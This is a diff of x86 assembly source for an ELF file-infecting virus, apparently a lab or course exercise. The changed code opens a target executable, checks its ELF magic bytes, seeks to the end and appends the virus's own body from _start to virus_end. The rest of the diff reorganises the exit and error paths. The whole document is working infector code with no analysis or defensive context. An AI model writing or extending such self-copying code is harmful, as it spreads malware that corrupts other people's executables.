@@ -82,37 +82,33 @@ _start:
 	open FileName,RDWR,0777
 	mov [ebp-4], eax  ;save fd in local vars
 	cmp dword[ebp-4], -1
-    jle .print_openFail
+    jle VirusExit_with_err.print_openFail
     mov ecx,ebp
-    sub ecx,8;
-    read dword[ebp-4],ecx,4; read from eax that is in ebp-4 the magic numbers
-    cmp byte[ebp-8], 0x7f; elfmago0
-    jne .print_Failstr;
-    cmp byte[ebp-8+1],'E'; elfmago1
-    jne .print_Failstr;
-    cmp byte[ebp-8+2], 'L'; elfmago2
-    jne .print_Failstr;
-    cmp byte[ebp-8+3],'F'; elfmago3
-    jne .print_Failstr;
+    sub ecx,8	; ecx is now [ebp-8]
+    read dword[ebp-4],ecx,4; read from fd that is in [ebp-4] the magic numbers to begining address of [ebp-8]
+    cmp byte[ecx], 0x7f; elfmago0
+    jne VirusExit_with_err;
+    cmp byte[ecx+1],'E'; elfmago1
+    jne VirusExit_with_err;
+    cmp byte[ecx+2], 'L'; elfmago2
+    jne VirusExit_with_err;
+    cmp byte[ecx+3],'F'; elfmago3
+    jne VirusExit_with_err;
+
+	print_OutStr
 
 	.infect:
 	lseek dword[ebp-4], 0, SEEK_END ; get to end of file
 	; set up len in bytes of printing code in edx
-	mov edx, _start.nopnop
-	sub edx, _start.print_OutStr
-	write dword[ebp-4], .print_OutStr, edx ; write the print command
+	mov edx, virus_end
+	sub edx, _start
+	write dword[ebp-4], _start, edx ; write the print command
 
 	.print_OutStr:
-		print_OutStr
-		.nopnop:
+		
 		close [ebp-4]
 		jmp VirusExit
-	.print_Failstr:
-		print_Failstr
-		jmp VirusExit
-	.print_openFail:
-		print_openFail
-		jmp VirusExit
+
 
 
 VirusExit:
@@ -122,6 +118,20 @@ VirusExit:
 
        exit 0            ; Termination if all is OK and no previous code to jump to
                          ; (also an example for use of above macros)
+
+
+VirusExit_with_err:
+	
+	.print_Failstr:
+		print_Failstr
+		jmp .exit
+
+	.print_openFail:
+		print_openFail
+		jmp .exit
+
+	.exit:
+    	exit 1            
 	
 FileName:	db "ELFexecTestFile", 0
 ;FileName:	db "ELFexec1", 0
@@ -131,7 +141,6 @@ Failstr:        db "perhaps not", 10 , 0
 Failstr_len: equ $-Failstr
 OpenErrStr: db "File open fail", 10, 0
 OpenErrStr_len: equ $-OpenErrStr
-print_OutStr_len: equ _start.print_OutStr-_start.nopnop
 
 get_my_loc:
 	call next_i
